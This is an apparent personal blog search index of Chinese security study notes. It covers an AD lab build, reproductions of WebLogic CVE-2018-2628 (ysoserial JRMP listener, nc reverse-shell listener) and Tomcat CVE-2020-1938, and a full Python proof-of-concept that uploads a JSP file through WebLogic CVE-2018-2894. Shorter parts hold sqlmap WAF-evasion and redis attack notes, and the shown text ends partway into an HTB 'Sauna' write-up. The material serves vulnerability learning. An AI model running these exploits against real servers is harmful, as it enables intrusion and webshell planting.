<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>域环境搭建</title>
      <link href="/2020/10/02/yu-huan-jing-da-jian/"/>
      <url>/2020/10/02/yu-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  参考</p></blockquote><p><a href="https://juejin.im/post/6844903954313117704" target="_blank" rel="noopener">https://juejin.im/post/6844903954313117704</a></p><blockquote><p>  材料</p></blockquote><p>windwos server 2008</p><p>windows 10</p><blockquote><p>  “hello world”</p></blockquote><p>为服务器配置静态ip，将DNS服务器设为本地地址（稍后将DNS安装到本地）</p><p><img src="image-20201007091907638.png" alt></p><p>添加角色</p><p><img src="image-20201007092052122.png" alt></p><p><img src="image-20201007092116232.png" alt></p><p><img src="image-20201007092212957.png" alt></p><p>88端口被占用（一般是不会被占用的吧，hhh），将其关闭，再启动 dcpromo.exe程序</p><p><img src="image-20201007092320385.png" alt></p><p>打开域服务安装向导</p><p><img src="image-20201007092718307.png" alt></p><p><img src="image-20201007092742561.png" alt></p><p>输入域名</p><p><img src="image-20201007093110962.png" alt></p><p>这一步好像涉及向下兼容的问题，管他呢，选个最高的</p><p><img src="image-20201007093322840.png" alt></p><p><img src="image-20201007093401496.png" alt></p><p><img src="image-20201007093425606.png" alt></p><p><img src="image-20201007093441251.png" alt></p><p>要求使用强密码</p><p><img src="image-20201007093512318.png" alt></p><p><img src="image-20201007093535454.png" alt></p><p>重启后自动使用域用户登陆了</p><p><img src="image-20201007094904475.png" alt></p><p><img src="image-20201007095251705.png" alt></p><blockquote><p>  将win10加入域</p></blockquote><p><img src="image-20201007095403970.png" alt></p><p><img src="image-20201007095429014.png" alt></p><p><img src="image-20201007095459979.png" alt></p><p><img src="image-20201007095521112.png" alt></p><p>打开win10</p><p><img src="image-20201007095640652.png" alt></p><p><img src="image-20201007095655454.png" alt></p><p><img src="image-20201007095714841.png" alt></p><p><img src="image-20201007095725415.png" alt></p><p><img src="image-20201007095810352.png" alt></p><p><img src="image-20201007095856938.png" alt></p><p>将win10的NDS设为win2008的地址</p><p><img src="image-20201007100128392.png" alt></p><p><img src="image-20201007100229584.png" alt></p><p>重启生效</p><p><img src="image-20201007100516527.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic CVE-2018-2628</title>
      <link href="/2020/08/09/weblogic-cve-2018-2628/"/>
      <url>/2020/08/09/weblogic-cve-2018-2628/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  影响版本</p></blockquote><p>Weblogic 10.3.6.0、Weblogic 12.1.3.0、Weblogic 12.2.1.2、Weblogic 12.2.1.3</p><blockquote><p>  复现</p></blockquote><p>利用 ysoserial 执行命令搭建一个 JRMP Server</p><pre class="line-numbers language-shell"><code class="language-shell">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]  #反弹shell要编码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 <a href="https://www.exploit-db.com/exploits/44553" target="_blank" rel="noopener">exp</a> 让目标请求访问上一步搭建的 JRMP Server</p><pre class="line-numbers language-shell"><code class="language-shell">python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] JRMPClient  #JRMPClient 也可以是 JRMPClient2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听</p><pre class="line-numbers language-shell"><code class="language-shell">nc -lvvp [port]  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tomcat CVE-2020-1938</title>
      <link href="/2020/08/07/tomcat-cve-2020-1938/"/>
      <url>/2020/08/07/tomcat-cve-2020-1938/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  描述</p></blockquote><p>默认开启 8009 端口，使用 AJP 协议，存在文件包含漏洞，可以实现ROOT目录下的文件读取</p><blockquote><p>  tomcat 目录结构</p></blockquote><p><img src="image-20200808073113425.png" alt></p><blockquote><p>  漏洞复现</p></blockquote><p><a href="https://github.com/0nise/CVE-2020-1938" target="_blank" rel="noopener">poc下载</a></p><p>查看 webapps/ROOT/ 内容</p><p><img src="image-20200808073320702.png" alt></p><p><img src="image-20200808073341298.png" alt></p><p>尝试读取 ROOT 下的一个文件，一般读取 WEB-INF/web.xml ，因为这个文件一般都会有</p><p><img src="image-20200808073745445.png" alt></p><p>可以读取文件，证明漏洞存在</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic_CVE-2018-2894</title>
      <link href="/2020/07/11/weblogic-cve-2018-2894/"/>
      <url>/2020/07/11/weblogic-cve-2018-2894/</url>
      
        <content type="html"><![CDATA[<blockquote><p>版本</p></blockquote><p><strong>10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</strong></p><blockquote><p>  条件</p></blockquote><p>需要知道web应用的目录</p><p>可以试着访问<code>[host]/ws_utc/resources/setting/options/general</code> </p><blockquote><p>  先手动</p></blockquote><p><img src="image-20200711130115636.png" alt></p><p>找到下面这个选项，版本不同可能位置有差异，找找就好了</p><p><img src="image-20200711130229982.png" alt></p><p>保存好后，访问 <code>http://xx.xx.xx.xx:port/ws_utc/config.do</code>，修改下面的路径为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code> ，这是可以随便访问的目录</p><p><img src="image-20200711130539974.png" alt></p><p>左侧安全，添加webshell，开启burp抓包</p><p>上传成功后访问，文件名是 “时间戳_文件名”</p><p><img src="image-20200711131427707.png" alt></p><p>可以访问。</p><blockquote><p>  试试 poc</p></blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> argparse<span class="token keyword">import</span> requests<span class="token keyword">import</span> traceback<span class="token keyword">import</span> xml<span class="token punctuation">.</span>etree<span class="token punctuation">.</span>ElementTree <span class="token keyword">as</span> ET<span class="token keyword">def</span> <span class="token function">get_current_work_path</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    geturl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/ws_utc/resources/setting/options/general"</span>    ua <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'</span><span class="token punctuation">}</span>    values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        request <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>geturl<span class="token punctuation">)</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token string">"[-] {}  don't exists CVE-2018-2894"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token string">"Deploying Application"</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>text<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] First Deploying Website Please wait a moment ..."</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>            request <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>geturl<span class="token punctuation">,</span> headers<span class="token operator">=</span>ua<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"&lt;/defaultValue>"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            root <span class="token operator">=</span> ET<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span>            value <span class="token operator">=</span> root<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"section"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"options"</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> e <span class="token keyword">in</span> value<span class="token punctuation">:</span>                <span class="token keyword">for</span> sub <span class="token keyword">in</span> e<span class="token punctuation">:</span>                    <span class="token keyword">if</span> e<span class="token punctuation">.</span>tag <span class="token operator">==</span> <span class="token string">"parameter"</span> <span class="token operator">and</span> sub<span class="token punctuation">.</span>tag <span class="token operator">==</span> <span class="token string">"defaultValue"</span><span class="token punctuation">:</span>                        values<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sub<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] Cannot connect url: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>geturl<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> values<span class="token punctuation">:</span>        <span class="token keyword">return</span> values<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Cannot get current work path\n"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_new_work_path</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    origin_work_path <span class="token operator">=</span> get_current_work_path<span class="token punctuation">(</span>host<span class="token punctuation">)</span>    works <span class="token operator">=</span> <span class="token string">"/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"</span>    <span class="token keyword">if</span> <span class="token string">"user_projects"</span> <span class="token keyword">in</span> origin_work_path<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"\\"</span> <span class="token keyword">in</span> origin_work_path<span class="token punctuation">:</span>            works <span class="token operator">=</span> works<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">)</span>            current_work_home <span class="token operator">=</span> origin_work_path<span class="token punctuation">[</span><span class="token punctuation">:</span>origin_work_path<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"user_projects"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"user_projects\\domains"</span>            dir_len <span class="token operator">=</span> len<span class="token punctuation">(</span>current_work_home<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            domain_name <span class="token operator">=</span> origin_work_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>dir_len<span class="token punctuation">]</span>            current_work_home <span class="token operator">+=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> domain_name <span class="token operator">+</span> works        <span class="token keyword">else</span><span class="token punctuation">:</span>            current_work_home <span class="token operator">=</span> origin_work_path<span class="token punctuation">[</span><span class="token punctuation">:</span>origin_work_path<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"user_projects"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"user_projects/domains"</span>            dir_len <span class="token operator">=</span> len<span class="token punctuation">(</span>current_work_home<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            domain_name <span class="token operator">=</span> origin_work_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>dir_len<span class="token punctuation">]</span>            current_work_home <span class="token operator">+=</span> <span class="token string">"/"</span> <span class="token operator">+</span> domain_name <span class="token operator">+</span> works    <span class="token keyword">else</span><span class="token punctuation">:</span>        current_work_home <span class="token operator">=</span> origin_work_path        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] cannot handle current work home dir: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>origin_work_path<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> current_work_home<span class="token keyword">def</span> <span class="token function">set_new_upload_path</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"setting_id"</span><span class="token punctuation">:</span> <span class="token string">"general"</span><span class="token punctuation">,</span>        <span class="token string">"BasicConfigOptions.workDir"</span><span class="token punctuation">:</span> path<span class="token punctuation">,</span>        <span class="token string">"BasicConfigOptions.proxyHost"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        <span class="token string">"BasicConfigOptions.proxyPort"</span><span class="token punctuation">:</span> <span class="token string">"80"</span><span class="token punctuation">}</span>    request <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">"/ws_utc/resources/setting/options"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"successfully"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>content<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Change New Upload Path failed"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_webshell</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">:</span>    set_new_upload_path<span class="token punctuation">(</span>host<span class="token punctuation">,</span> get_new_work_path<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>    files <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"ks_edit_mode"</span><span class="token punctuation">:</span> <span class="token string">"false"</span><span class="token punctuation">,</span>        <span class="token string">"ks_password_front"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">"ks_password_changed"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>        <span class="token string">"ks_filename"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"360sglab.jsp"</span><span class="token punctuation">,</span> upload_content<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    request <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>host <span class="token operator">+</span> uri<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>    response <span class="token operator">=</span> request<span class="token punctuation">.</span>text    match <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;id>(.*?)&lt;/id>"</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span>    <span class="token keyword">if</span> match<span class="token punctuation">:</span>        tid <span class="token operator">=</span> match<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        shell_path <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/ws_utc/css/config/keystore/"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>tid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_360sglab.jsp"</span>        <span class="token keyword">if</span> upload_content <span class="token keyword">in</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shell_path<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] {} exists CVE-2018-2894"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Check URL: {} "</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>shell_path<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] {}  don't exists CVE-2018-2894"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] {}  don't exists CVE-2018-2894"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> <span class="token string">"360sglab"</span>    url <span class="token operator">=</span> <span class="token string">"/ws_utc/resources/setting/keystore"</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-t"</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'target'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"http://127.0.0.1:7001"</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token punctuation">,</span>                        help<span class="token operator">=</span><span class="token string">"target, such as: http://example.com:7001"</span><span class="token punctuation">)</span>    upload_content <span class="token operator">=</span> <span class="token string">"360sglab test"</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>        <span class="token string">'X-Requested-With'</span><span class="token punctuation">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">,</span> <span class="token punctuation">}</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>argv<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'-h'</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    target <span class="token operator">=</span> args<span class="token punctuation">.</span>target    target <span class="token operator">=</span> target<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"://"</span> <span class="token operator">not</span> <span class="token keyword">in</span> target<span class="token punctuation">:</span>        target <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> target    <span class="token keyword">try</span><span class="token punctuation">:</span>        upload_webshell<span class="token punctuation">(</span>target<span class="token punctuation">,</span> url<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Error: \n"</span><span class="token punctuation">)</span>        traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是 poc 香呀，一步到位</p><p><img src="image-20200711133505383.png" alt></p><p><img src="image-20200711133408133.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic 搭建</title>
      <link href="/2020/07/10/weblogic-1/"/>
      <url>/2020/07/10/weblogic-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  不会 jsp 的人来搭建 weblogic 了</p></blockquote><p>先要有 java 环境，但我不会 java，就不展示蹩脚的 java 安装过程了……</p><pre class="line-numbers language-shell"><code class="language-shell">java -jar fmw_12.1.3.0.0_wls.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>总之弹出这框框就对了</p><p><img src="image-20200710092008274.png" alt></p><p>真的不了解这个东西，全部点下一步…… 安装完成</p><p><img src="image-20200710092324963.png" alt></p><p>又有一个框框</p><p><img src="image-20200710092524077.png" alt></p><p>还是一路下一步…… 改配密码的配密码，也就没什么了</p><p><img src="image-20200710092806539.png" alt></p><p>这一步选个这个就可以了，其他的我也不会……</p><p><img src="image-20200710092924193.png" alt></p><p>最后启动看看……输个密码</p><p><img src="image-20200710093133538.png" alt></p><p>看到个 running，盲猜服务器因该是起来了，访问一下试试。</p><p><img src="image-20200710093303823.png" alt></p><p><img src="image-20200710093539373.png" alt></p><p><img src="images.jpg" alt></p><blockquote><p>  好了，试试 github 上找的漏洞探测脚本 hh</p></blockquote><p> <a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">weblogicScan</a></p><p><img src="image-20200710094810904.png" alt></p><p>i 了，i 了</p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap</title>
      <link href="/2020/07/08/nmap/"/>
      <url>/2020/07/08/nmap/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  脚本位置</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell"># /usr/share/nmap/scripts/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell"># 通用nmap --script=vuln target <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2020/07/07/sqlmap/"/>
      <url>/2020/07/07/sqlmap/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-shell"><code class="language-shell"># 识别waf--identify-waf# tamperspace2comment.py  # /**/ 代替空格base64encode.oy  #base64 编码# 随机的UA--random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python wad</title>
      <link href="/2020/07/07/python-wad/"/>
      <url>/2020/07/07/python-wad/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  安装wad</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">pip3 install wad<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>  加入环境变量</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">#linuxsudo vim /etc/profile#末尾添加export PATH="/wad_path:$PATH"source /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>  简单使用</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">wad -u urlwad -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis 1</title>
      <link href="/2020/07/02/redis-1/"/>
      <url>/2020/07/02/redis-1/</url>
      
        <content type="html"><![CDATA[<p>简单记录</p><pre class="line-numbers language-shell"><code class="language-shell">#redis 默认端口 6379#配置文件 redis安装目录/redis.conf(windows redis.windows.conf)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">#数据类型stringhashsetzsetlist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">#命令redis-cli -h host -p port -a password  #远程连接nc -v ip port #command key_name del key dump key  #序列号key，并返回 exists key  ...info  #查看服务器信息config get requirepass  #查看登陆密码 默认是空config set requirepass aling  #设置密码为alingauth passwd  #验证身份flushall  #删除所有数据flushdb  #刷新所有数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路</p><pre class="line-numbers language-shell"><code class="language-shell">#内网端口扫描nmap -v -n -Pn -p 6379 -sV --script redis-info ip_address#读取配置文件拿 获得明文密码#使用redis暴力破解工具爆破tool_name:node #msf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sauna</title>
      <link href="/2020/06/27/sauna/"/>
      <url>/2020/06/27/sauna/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  nmap 扫描</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo nmap -sV -sS 10.10.10.175[sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 20:01 EDTStats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 91.67% done; ETC: 20:02 (0:00:03 remaining)Nmap scan report for bogon (10.10.10.175)Host is up (0.26s latency).Not shown: 988 filtered portsPORT     STATE SERVICE       VERSION53/tcp   open  domain?80/tcp   open  http          Microsoft IIS httpd 10.088/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-27 07:05:50Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  tcpwrapped3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=6/26%Time=5EF68C65%P=x86_64-pc-linux-gnu%r(DNSVSF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\SF:x04bind\0\0\x10\0\x03");Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 171.60 secondskali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>80 端口开放，但没能从这个点找到突破……但发现了一些用户名可能有用，记录下来写到字典里</p><p><img src="image-20200627080825648.png" alt></p><p>转眼到 ldap 协议和 kerberos 协议，尝试 AD 攻击</p><p>nmap 再次扫描</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ sudo nmap -sS --script ldap*.nse 